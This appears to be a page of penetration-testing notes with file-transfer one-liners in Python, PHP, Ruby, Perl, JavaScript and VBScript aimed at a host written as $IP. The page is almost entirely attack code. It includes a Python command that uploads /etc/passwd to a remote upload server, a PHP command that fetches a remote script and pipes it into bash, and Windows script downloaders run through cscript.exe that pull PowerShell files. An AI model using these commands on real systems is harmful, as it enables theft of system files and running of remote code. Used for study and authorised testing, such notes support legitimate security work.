---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
---

# Code

## Python

```python
# Python2 - Download
python2 -c 'import urllib;urllib.urlretrieve ("http://$IP/test.txt", "test.txt")'

# Python3 - Download
python3 -c 'import urllib.request;urllib.request.urlretrieve("http://$IP/test.txt", "test.txt")'

# Python3 - Upload
python3 -m uploadserver 
python3 -c 'import requests;requests.post("http://$IP:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

## PHP

```php
// PHP - Download
php -r '$file = file_get_contents("http://$IP/test.txt"); file_put_contents("test.txt",$file);'

// PHP - Download 
php -r 'const BUFFER = 1024; $fremote = 
fopen("http://$IP/test.txt", "rb"); $flocal = fopen("test.txt", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

// PHP - Download
php -r '$lines = @file("http://$IP/test.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

## Ruby

```ruby
# Ruby - Download
ruby -e 'require "net/http"; File.write("test.txt", Net::HTTP.get(URI.parse("http://$IP/test.txt")))'
```

## Perl

```perl
# Perl - Download
perl -e 'use LWP::Simple; getstore("http://$IP/test.txt", "test.txt")'
```

## JavaScript

```javascript
// JavaScript - Download
// Save as wget.js file
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));

// Download a file using javascript and cscript.exe
cscript.exe /nologo wget.js http://$IP/test.ps1 test.ps1
```

## VBScript

```visual-basic
' VBScript - Download
' Save as wget.vbs file
dim xHttp: Set xHttp = createObject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createObject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
	.type = 1
	.open
	.write xHttp.responseBody
	.savetofile WScript.Arguments.Item(1), 2
end with

' Download a file using VBScript and cscript.exe
cscript.exe /nologo wget.vbs http://$IP/test.ps1 test.ps1
```
